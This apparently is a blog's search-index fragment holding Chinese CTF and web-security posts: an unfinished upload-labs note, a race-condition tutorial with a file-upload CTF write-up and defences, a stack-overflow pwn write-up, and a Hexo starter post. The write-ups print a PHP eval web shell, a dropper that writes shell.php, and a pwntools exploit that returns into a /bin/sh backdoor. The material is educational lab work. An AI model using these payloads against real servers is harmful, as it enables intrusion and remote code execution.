    <content type="html"><![CDATA[<h2 id="upload-labs靶场学习小记">upload-labs靶场学习小记</h2><h6 id="upload-labs靶场项目地址-https-github-com-c0ny1-upload-labs">upload-labs靶场项目地址: <a href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></h6><p>先来看Pass-01</p><p>题目描述是<code>本pass在客户端使用js对不合法图片进行检查！</code>我们可以提取其中的关键词<code>js</code>于是设想使用浏览器禁用js来实现绕过，以chrome浏览器为例</p><p>这里有一张图片 ·</p><p>上传并解析成功</p><p>这有一张图片</p><p>然后是Pass-02</p><p>题目描述为<code>本pass在服务端对数据包的MIME进行检查！</code>我们尝试把数据包截取下来进行简单分析</p><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全日志</tag>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>条件竞争漏洞学习</title>
    <link href="/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="Web安全条件竞争漏洞学习">Web安全条件竞争漏洞学习</h2><h4 id="0x00-概述">0x00 概述</h4><p>​条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并发进行的，而开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。</p><h6 id="简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作">简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作</h6><h4 id="0x01-简单分析">0x01 简单分析</h4><p>我们来设计一个简答的业务逻辑：商城系统中，用户提交折扣码，后端会检测用户是否已经使用过折扣码。若未使用过，则使用该折扣码，并记录折扣码使用状态为True。若已使用折扣码，用户再次使用折扣码时，后端程序读取折扣码使用状态为True，拒绝用户再次使用折扣码。</p><p><img src="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp" alt="Lesson-eb3846115f6b8"></p><p>我们在这里用一段简单的python代码来模拟后端逻辑，处理请求的<code>handle_req()</code>函数是并发（多线程/多进程）执行的：</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> **handle_req**():    <span class="hljs-keyword">if</span> code_already_used = <span class="hljs-literal">False</span>: <span class="hljs-comment"># 判断如果没有使用过折扣码（实际应该是对数据库的查询，此处简化写法）</span>        use_code()  <span class="hljs-comment"># 使用折扣码，对商品进行打折</span>        code_already_used = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 使用过折扣码后，将折扣码使用状态为True（实际应该是对数据库的数据更新，此处简化写法）</span>    <span class="hljs-keyword">else</span>:  <span class="hljs-comment"># 若已经使用过折扣码</span>        reject_use_code()        <span class="hljs-comment"># 拒绝再次使用折扣码</span></code></pre></div><p>但是这个过程可能会存在条件竞争漏洞，因为我们第一次请求判断的状态为false即未使用折扣码，但是第一个请求执行到第四行时准备更新数据库内容而第二个请求又开始执行并将折扣码使用状态再一次地标记为false，从而造成了使用了两次折扣码，触发了条件竞争漏洞，如下图所示：后端将记录折扣码使用状态为True之前，可能存在条件竞争，上述第2、3行代码执行的时间就是<code>竞争窗口</code>。</p><p><img src="https://pica.zhimg.com/80/v2-b3ccc0bc7165f6bd90fcf6769c591786_720w.webp" alt="Lesson-eb3846115f6b8"></p><p>竞争窗口一般是一段很短的时间段（几毫秒甚至更短），用户通过并行发送多个数据包，使得服务端竞争窗口内执行多次特定的功能。</p><p><img src="https://pic4.zhimg.com/80/v2-936e0bec041297e3b7f8b1f0d9f568d1_720w.webp" alt="Lesson-eb3846115f6b8"></p><h4 id="0x02-CTF中的条件竞争">0x02 CTF中的条件竞争</h4><p>我们来看这样的一道题目</p><p>【题型】<a href>Web</a><br>【题目】<code>wzsc_文件上传</code><br>【来源】（[攻防世界](<a href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/list）</a><br>【思路】<a href>条件竞争</a></p><p>我们先上传一个一句话木马并把包拦截下来进行分析测试</p><div class="code-wrapper"><pre><code class="hljs bash">POST /upload.php HTTP/1.1Host: Host:PortContent-Length: 230Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://61.147.171.105:56903Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMwWBoiGSKcfAYxLhUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Referer: Host:PortAccept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: close------WebKitFormBoundaryMwWBoiGSKcfAYxLhContent-Disposition: form-data; name=<span class="hljs-string">&quot;file&quot;</span>; filename=<span class="hljs-string">&quot;classic.php&quot;</span>Content-Type: application/octet-stream&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;shell&quot;</span>]); ?&gt;------WebKitFormBoundaryMwWBoiGSKcfAYxLh--</code></pre></div><p>我们把它放到Repeater中放出去看看，查看返回包</p><div class="code-wrapper"><pre><code class="hljs bash">HTTP/1.1 200 OKDate: Sat, 08 Feb 2025 09:38:03 GMTServer: Apache/2.4.18 (Ubuntu)Content-Length: 0Connection: closeContent-Type: text/html; charset=UTF-8</code></pre></div><p>我们可以看到这里的状态码是200，证明我们是可以成功上传但是在服务器中被删除了，那这时候可以使用以下思路</p><p>我们先尝试访问我们上传的一句话并拦截包</p><div class="code-wrapper"><pre><code class="hljs bash">GET /upload/classic.php HTTP/1.1Host: 61.147.171.105:56903Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9Connection: close</code></pre></div><p>这样，我们可以在<code>BurpSuite</code>中同时拦截下这两个数据包，然后发送至Intruder模块，将payload设置为<code>Null Payload</code>，并开始攻击，这样我们还需要搭配上这样的一句PHP代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span></code></pre></div><p>它的作用是只要我们上传的文件能被成功访问，它就能在服务器上新建一个<code>shell.php</code>并将一句话写入，从而使我们能够成功<code>getshel</code>l~</p><p>用两个不同的数据包设置<code>Null Payload</code>的作用是利用我们提到的“竞争窗口”即上传成功到被删除的这一小段时间去访问我们上传的内鬼让其在服务器上生成一个接应我们的shell，其实简单地说就是用两个不同的操作去同时读写一个文件</p><p><img src="https://pic2.zhimg.com/80/v2-98252be57cdc6ace37d120354c2b5da1_720w.webp" alt="4"></p><p>Success to upload！</p><p>成功拿到flag：<code>cyberpeace&#123;This_is_a_sample_flag&#125;</code></p><h4 id="0x03-如何防御？">0x03 如何防御？</h4><p>以下总结了一些防御方法和常见条件竞争漏洞示例及防御</p><p>(1) 使用同步机制<br>锁（Lock）：通过加锁确保同一时间只有一个线程或进程可以访问共享资源。<br>信号量（Semaphore）：限制同时访问资源的线程或进程数量。<br>互斥量（Mutex）：类似于锁，用于多线程环境。<br>(2) 原子操作<br>使用原子操作确保操作的不可分割性。<br>示例：<br>数据库中的事务（Transaction）。<br>编程语言中的原子类型（如 atomic 在 C++ 或 Java 中）。<br>(3) 避免共享资源<br>尽量减少共享资源的使用，采用线程本地存储（Thread Local Storage, TLS）或进程隔离。<br>示例：<br>使用线程本地变量代替全局变量。<br>(4) 文件操作防御<br>使用文件锁（File Lock）确保同一时间只有一个进程可以访问文件。<br>(5) 数据库操作防御<br>使用事务（Transaction）和锁机制（如行锁、表锁）确保数据一致性。<br>(6) 时间窗口最小化<br>减少竞争条件的发生概率，尽量缩短共享资源的访问时间。<br>示例：<br>在文件操作中，尽快释放文件锁。<br>(7) 使用不可变对象<br>使用不可变对象（Immutable Objects）避免共享资源被修改。<br>示例：<br>在函数式编程中，尽量使用不可变数据结构。<br>(8) 输入验证和边界检查<br>对用户输入进行严格验证，避免恶意输入触发竞争条件。<br>示例：<br>检查文件路径、用户权限等。<br>(9) 代码审查和测试<br>通过代码审查发现潜在的竞争条件。<br>使用压力测试和并发测试工具（如 JMeter、Locust）模拟高并发场景。</p><p>常见条件竞争漏洞示例及防御<br>(1) TOCTOU（Time-of-Check to Time-of-Use）</p><div class="code-wrapper"><pre><code class="hljs c">漏洞描述：在检查资源状态和使用资源之间存在时间窗口，攻击者可以利用这个时间窗口修改资源状态。防御方法：    使用原子操作（如 open() 的 O_EXCL 标志）。    示例（C 语言）：    c    复制    <span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;file.txt&quot;</span>, O_WRONLY | O_CREAT | O_EXCL, <span class="hljs-number">0644</span>);    <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>) &#123;        <span class="hljs-comment">// 文件已存在</span>    &#125;</code></pre></div><p>(2) 文件上传漏洞</p><div class="code-wrapper"><pre><code class="hljs python">漏洞描述：攻击者在上传文件时，利用时间窗口替换文件内容。防御方法：    使用临时文件，上传完成后再重命名。    示例：    python    复制    <span class="hljs-keyword">import</span> os    <span class="hljs-keyword">import</span> tempfile    <span class="hljs-keyword">with</span> tempfile.NamedTemporaryFile(delete=<span class="hljs-literal">False</span>) <span class="hljs-keyword">as</span> tmp_file:        tmp_file.write(<span class="hljs-string">b&quot;file content&quot;</span>)        tmp_path = tmp_file.name    os.rename(tmp_path, <span class="hljs-string">&quot;final_file.txt&quot;</span>)</code></pre></div><p>(3) 并发修改共享变量</p><div class="code-wrapper"><pre><code class="hljs java">漏洞描述：多个线程同时修改共享变量，导致数据不一致。防御方法：    使用锁或原子操作。    示例（Java）：    java    复制    <span class="hljs-keyword">import</span> java.util.concurrent.atomic.AtomicInteger;    <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">sharedResource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateResource</span><span class="hljs-params">()</span> &#123;        sharedResource.incrementAndGet();    &#125;</code></pre></div><h6 id="一些素材来源：">一些素材来源：</h6><p><a href="https://noa.pages.dev/posts/web_security/race_conditions/">Noah’s Blog</a></p><p><a href="https://chat.deepseek.com/">DeepSeek</a></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-pwnstack题解</title>
    <link href="/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/"/>
    <url>/2025/02/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwnstack%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="攻防世界-pwnstack题解">攻防世界-pwnstack题解</h2><p>这是新博客的第一篇文章，感觉空荡荡的就当一次随笔</p><h4 id="一、简述">一、简述</h4><p>【题型】<a href>PWN</a><br>【题目】<code>pwnstack</code><br>【来源】[攻防世界](<a href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/list）</a><br>【思路】<a href>栈溢出</a></p><h4 id="二、思路及过程">二、思路及过程</h4><p>Step.1：先使用<code>checksec</code>和<code>file</code>了解有关这个文件的一些信息</p><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># zer0-r1ng @ ring0rez-Laptop in ~/Challenge/Adworld/pwnstack/[16:27:17]</span>$ checksec pwn2[*] <span class="hljs-string">&#x27;/Challenge/Adworld/pwnstack/pwn2&#x27;</span>    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      No canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    Stripped:   No<span class="hljs-comment"># zer0-r1ng @ ring0rez-Laptop in ~/Challenge/Adworld/pwnstack/[16:30:13] C:1</span>$ file pwn2pwn2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="hljs-keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=62aa40d64871e142a32827b4e403772e72f67fba, not stripped</code></pre></div><p>我们从中可以得知它是一个64位的ELF格式文件</p><p>Step.2：放入IDA Pro中进行分析</p><div class="code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-built_in">initsetbuf</span>(argc, argv, envp);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;this is pwn1,can you do that??&quot;</span>);  <span class="hljs-built_in">vuln</span>();  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><p>在里面我们发现了一个非常可疑的<code>puts</code> 和<code>vuln</code> 函数，点进去看看</p><div class="code-wrapper"><pre><code class="hljs scss">__int64 <span class="hljs-built_in">vuln</span>()&#123;  char buf<span class="hljs-selector-attr">[160]</span>; <span class="hljs-comment">// [rsp+0h] [rbp-A0h] BYREF</span>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, sizeof(buf));  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0</span>xB1uLL);  return <span class="hljs-number">0</span>LL;&#125;</code></pre></div><p>在vuln函数中我们可以看到函数分配了一个大小为 160 字节的缓冲区 <code>buf</code>，然后使用 <code>read</code> 函数从标准输入（文件描述符 0）读取数据到这个缓冲区中。然而，<code>read</code> 函数被指示读取最多 0xB1（即 177）字节的数据，这比缓冲区 <code>buf</code> 能够容纳的多，从而导致了缓冲区溢出的风险。</p><p>Step.5：shift+F12查看字符串发现<code>/bin/sh</code>，进入发现后门函数，查看地址（ctr+x）发现为：<code>0x400762</code></p><div class="code-wrapper"><pre><code class="hljs c">LOAD:<span class="hljs-number">0000000000400238</span><span class="hljs-number">0000001</span>CC/lib64/ld-linux-x86<span class="hljs-number">-64.</span>so.<span class="hljs-number">2</span>LOAD:<span class="hljs-number">00000000004003B</span>9<span class="hljs-number">0000000</span>AClibc.so.<span class="hljs-number">6</span>LOAD:<span class="hljs-number">00000000004003</span>C8<span class="hljs-number">00000006</span>C<span class="hljs-built_in">stdin</span>LOAD:<span class="hljs-number">00000000004003</span>D3<span class="hljs-number">00000007</span>C<span class="hljs-built_in">stdout</span>LOAD:<span class="hljs-number">00000000004003</span>DA<span class="hljs-number">00000007</span>C<span class="hljs-built_in">stderr</span>LOAD:<span class="hljs-number">00000000004003E1</span><span class="hljs-number">00000007</span>CsystemLOAD:<span class="hljs-number">00000000004003E8</span><span class="hljs-number">00000008</span>CsetvbufLOAD:<span class="hljs-number">00000000004003F</span>0<span class="hljs-number">00000012</span>C__libc_start_mainLOAD:<span class="hljs-number">0000000000400402</span><span class="hljs-number">0000000F</span>C__gmon_start__LOAD:<span class="hljs-number">0000000000400411</span><span class="hljs-number">0000000</span>CCGLIBC_2.<span class="hljs-number">2.5</span>.rodata:<span class="hljs-number">0000000000400838</span><span class="hljs-number">00000008</span>C/bin/sh.rodata:<span class="hljs-number">0000000000400848</span><span class="hljs-number">0000001F</span>Cthis is pwn1,can you <span class="hljs-keyword">do</span> that??.eh_frame:<span class="hljs-number">000000000040091F</span><span class="hljs-number">00000006</span>C;*<span class="hljs-number">3</span>$\<span class="hljs-string">&quot;</span></code></pre></div><p>Step.6：构造exp并caught到flag</p><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<span class="hljs-attribute">p</span>=remote(&quot;Host&quot;,Port)<span class="hljs-attribute">payload</span>=b&#x27;a&#x27;*0xa8+p64(0x400762)p.sendline(payload)p.interactive()</code></pre></div><p>在上面的exp代码中使用了<code>pwntools</code>库并连接到远程服务器，随后我们构造了一个长度为”0xa8“并用’a’去填充和类型为二进制数据的payload，并覆盖返回地址到<code>0x400762</code>并将返回地址转换为小端序的64位进行表示</p><div class="code-wrapper"><pre><code class="hljs bash">zer0-r1ng @ ring0rez-Laptop <span class="hljs-keyword">in</span> ~/Challenge/Adworld/pwnstack/[16:50:22]$ python3 exp.py[+] Opening connection to 61.147.171.105 on port 54428: Done[*] Switching to interactive modethis is pwn1,can you <span class="hljs-keyword">do</span> that??$ <span class="hljs-built_in">ls</span>bindevflagliblib32lib64pwn2$ <span class="hljs-built_in">cat</span> flagcyberpeace&#123;9d0526386a432e6fcf65858cd1ee804d&#125;</code></pre></div><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2025/02/05/hello-world/"/>
    <url>/2025/02/05/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span></code></pre></div><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server">Run server</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo server</code></pre></div><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo generate</code></pre></div><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><div class="code-wrapper"><pre><code class="hljs bash">$ hexo deploy</code></pre></div><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><script src="https://giscus.app/client.js" data-repo="solkatt-cn/solkatt-cn.github.io" data-repo-id="R_kgDONzaTTQ" data-category="Announcements" data-category-id="DIC_kwDONzaTTc4Cpqn7" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
